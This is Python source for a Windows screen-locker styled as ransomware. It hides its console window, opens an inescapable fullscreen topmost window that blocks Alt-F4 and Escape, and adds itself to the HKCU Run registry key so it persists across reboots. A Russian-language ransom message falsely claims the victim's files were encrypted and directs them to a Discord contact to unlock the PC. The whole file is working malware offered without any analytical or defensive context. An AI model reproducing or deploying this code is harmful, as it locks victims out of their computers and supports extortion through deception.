import tkinter as tk
from tkinter import messagebox
import ctypes
import sys
import winreg
import hashlib

PASSWORD_HASH = hashlib.sha256(b"2099209920993000").hexdigest()

def check_password(password):
    return hashlib.sha256(password.encode()).hexdigest() == PASSWORD_HASH

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            winreg.SetValueEx(reg_key, "SystemLocker", 0, winreg.REG_SZ, exe_path)
    except:
        pass

def remove_from_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "SystemLocker")
    except:
        pass

class LockerWindow:
    def __init__(self, root):
        self.root = root
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        self.root.configure(bg='black')

        self.root.protocol("WM_DELETE_WINDOW", self.block_close)
        self.root.bind("<Alt-F4>", self.block_close)
        self.root.bind("<Escape>", self.block_close)
        self.root.bind("<Alt-F4>", self.block_close)
        self.root.bind("<Control>", self.block_close)
        

        title = tk.Label(
            root,
            text="You hacked team red crime. твои файлы были зашифрованы лошара",
            font=("Arial", 48, "bold"),
            fg="black",
            bg="red"
        )
        title.pack(pady=50)

        subtitle = tk.Label(
            root,
            text="Чтобы разблокировать ПК, напишите в Discord - akronov",
            font=("Arial", 24),
            fg="red",
            bg="red"
        )
        subtitle.pack(pady=20)

        self.password_var = tk.StringVar()
        self.entry = tk.Entry(
            root,
            textvariable=self.password_var,
            font=("Arial", 20),
            show="*",
            justify="center",
            width=20,
            bg="red",
            fg="white"
        )
        self.entry.pack(pady=50)
        self.entry.focus_set()

        self.btn = tk.Button(
            root,
            text="Разблокировать",
            font=("Arial", 18),
            bg="red",
            fg="white",
            command=self.unlock
        )
        self.btn.pack(pady=20)

        self.entry.bind("<Return>", lambda e: self.unlock())
        self.entry.bind("<KeyPress>", self.limit_input)

        self.root.grab_set()
        self.root.focus_force()

        add_to_startup()

    def limit_input(self, event):
        allowed = (48, 49, 50, 51, 52, 53, 54, 55, 56, 57,
                   8, 46, 13, 37, 38, 39, 40)
        if event.keycode not in allowed:
            return "break"

    def block_close(self, event=None):
        pass

    def unlock(self):
        password = self.password_var.get()
        if check_password(password):
            remove_from_startup()
            self.root.destroy()
            sys.exit(0)
        else:
            self.password_var.set("")
            self.entry.config(bg="darkred")
            self.root.after(300, lambda: self.entry.config(bg="black"))
            messagebox.showerror("Ошибка", "Неверный пароль!")
            self.entry.focus_set()

if __name__ == "__main__":
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    root = tk.Tk()
    app = LockerWindow(root)
    root.mainloop()
